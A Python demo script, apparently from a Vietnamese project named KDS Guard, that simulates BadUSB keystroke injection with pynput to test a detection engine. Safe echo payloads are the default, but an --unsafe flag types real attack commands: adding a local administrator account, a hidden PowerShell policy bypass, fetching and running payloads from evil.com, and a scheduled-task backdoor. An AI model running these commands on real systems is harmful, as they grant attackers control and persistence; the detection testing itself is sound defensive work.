"""
Simulate Injection Attack cho Demo
Mô phỏng hành vi BadUSB injection bằng cách gõ phím siêu nhanh qua pynput.

Dùng để demo Detection Engine phát hiện và cảnh báo.

Cách dùng:
    python scripts/simulate_injection.py [--type fast|medium|script|rubber_ducky]
    python scripts/simulate_injection.py --type fast --delay 3
"""

import time
import sys
import argparse

try:
    from pynput.keyboard import Controller, Key
except ImportError:
    print("❌ Cần cài pynput: pip install pynput")
    sys.exit(1)


# === Các mẫu injection ===
INJECTION_PAYLOADS = {
    "fast": {
        "name": "BadUSB Fast Injection",
        "description": "Mô phỏng BadUSB gõ siêu nhanh (< 10ms/phím)",
        "commands": [
            "powershell -ExecutionPolicy Bypass -WindowStyle Hidden",
            "cmd /c net user hacker P@ss123 /add",
            "cmd /c net localgroup administrators hacker /add",
        ],
        "inter_key_delay": 0.008,  # 8ms giữa các phím
        "inter_line_delay": 0.05,   # 50ms giữa các dòng
    },
    "medium": {
        "name": "BadUSB Medium Speed",
        "description": "Mô phỏng BadUSB tốc độ trung bình (20-30ms/phím)",
        "commands": [
            "cmd /c whoami",
            "cmd /c ipconfig /all",
            "cmd /c systeminfo | findstr OS",
        ],
        "inter_key_delay": 0.025,  # 25ms
        "inter_line_delay": 0.1,
    },
    "script": {
        "name": "Script Injection",
        "description": "Mô phỏng script tự động hóa gõ lệnh",
        "commands": [
            "curl -s http://evil.com/payload.ps1 | powershell",
            "certutil -urlcache -split -f http://evil.com/mal.exe",
            "schtasks /create /tn backdoor /tr mal.exe /sc onstart",
        ],
        "inter_key_delay": 0.015,  # 15ms
        "inter_line_delay": 0.08,
    },
    "rubber_ducky": {
        "name": "Rubber Ducky Style",
        "description": "Mô phỏng USB Rubber Ducky với GUI key combo",
        "commands": [
            # Sẽ bấm Win+R, đợi, rồi gõ lệnh
            "WIN_R",
            "cmd /c echo Rubber Ducky Attack Detected",
            "exit",
        ],
        "inter_key_delay": 0.005,  # 5ms - rất nhanh
        "inter_line_delay": 0.3,    # Đợi giữa các bước
    },
}

# Payload an toàn cho demo (không thực thi lệnh nguy hiểm)
SAFE_DEMO_PAYLOADS = {
    "fast": [
        "echo this is a simulated badusb fast injection attack",
        "echo speed test: very fast typing detected",
        "echo all keystrokes are being monitored by kds guard",
    ],
    "medium": [
        "echo medium speed injection simulation",
        "echo checking system information now",
        "echo kds guard should detect this pattern",
    ],
    "script": [
        "echo script injection simulation running",
        "echo downloading payload from remote server",
        "echo executing scheduled task creation",
    ],
    "rubber_ducky": [
        "echo rubber ducky style attack simulation",
        "echo this would normally open run dialog",
        "echo kds guard blocks automated keystrokes",
    ],
}


def type_string(keyboard: Controller, text: str, delay: float):
    """Gõ một chuỗi ký tự với delay giữa các phím."""
    for char in text:
        keyboard.press(char)
        keyboard.release(char)
        time.sleep(delay)


def simulate_injection(injection_type: str = "fast",
                       use_safe: bool = True,
                       initial_delay: int = 3):
    """
    Chạy mô phỏng injection.
    
    Args:
        injection_type: Loại injection (fast, medium, script, rubber_ducky)
        use_safe: Dùng payload an toàn cho demo
        initial_delay: Thời gian chờ trước khi bắt đầu (giây)
    """
    if injection_type not in INJECTION_PAYLOADS:
        print(f"❌ Loại injection không hợp lệ: {injection_type}")
        print(f"   Các loại hỗ trợ: {', '.join(INJECTION_PAYLOADS.keys())}")
        return

    config = INJECTION_PAYLOADS[injection_type]
    payloads = SAFE_DEMO_PAYLOADS[injection_type] if use_safe else config["commands"]

    print()
    print("╔══════════════════════════════════════════════════╗")
    print("║  💉 KDS Guard - Injection Simulator              ║")
    print("╠══════════════════════════════════════════════════╣")
    print(f"║  Type: {config['name']:<41} ║")
    print(f"║  Speed: {config['inter_key_delay']*1000:.0f}ms per key{' ':<30} ║")
    print(f"║  Safe mode: {'ON ✅' if use_safe else 'OFF ⚠️':<35} ║")
    print("╚══════════════════════════════════════════════════╝")
    print()
    print(f"  {config['description']}")
    print()

    # Countdown
    print(f"⏳ Bắt đầu sau {initial_delay} giây...")
    print("   👉 Hãy click vào cửa sổ Notepad hoặc text editor!")
    print()

    for i in range(initial_delay, 0, -1):
        print(f"   {i}...", end=" ", flush=True)
        time.sleep(1)
    print()
    print()

    keyboard = Controller()

    print("💉 Đang chạy injection...")
    print()

    for idx, payload in enumerate(payloads, 1):
        print(f"   [{idx}/{len(payloads)}] Gõ: {payload[:50]}...")

        # Gõ từng ký tự
        type_string(keyboard, payload, config["inter_key_delay"])

        # Nhấn Enter
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)

        # Delay giữa các dòng
        time.sleep(config["inter_line_delay"])

    print()
    print("✅ Injection simulation hoàn tất!")
    print()
    print("👀 Kiểm tra cửa sổ KDS Guard - nếu detection hoạt động, bạn sẽ thấy:")
    print("   🔴 CẢNH BÁO - Risk Score cao")
    print("   🔴 PHÁT HIỆN TẤN CÔNG HID INJECTION!")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="💉 KDS Guard - Injection Attack Simulator (for Demo)"
    )
    parser.add_argument(
        '--type', '-t',
        choices=['fast', 'medium', 'script', 'rubber_ducky'],
        default='fast',
        help='Loại injection (default: fast)'
    )
    parser.add_argument(
        '--delay', '-d',
        type=int,
        default=3,
        help='Thời gian chờ trước khi bắt đầu (giây, default: 3)'
    )
    parser.add_argument(
        '--unsafe',
        action='store_true',
        help='Dùng payload thật (KHÔNG khuyến nghị cho demo)'
    )
    parser.add_argument(
        '--list',
        action='store_true',
        help='Liệt kê các loại injection hỗ trợ'
    )

    args = parser.parse_args()

    if args.list:
        print("\n💉 Các loại injection hỗ trợ:\n")
        for key, config in INJECTION_PAYLOADS.items():
            print(f"  {key:15s} | {config['name']}")
            print(f"  {' ':15s} | Speed: {config['inter_key_delay']*1000:.0f}ms/key")
            print(f"  {' ':15s} | {config['description']}")
            print()
        return

    simulate_injection(
        injection_type=args.type,
        use_safe=not args.unsafe,
        initial_delay=args.delay,
    )


if __name__ == "__main__":
    main()
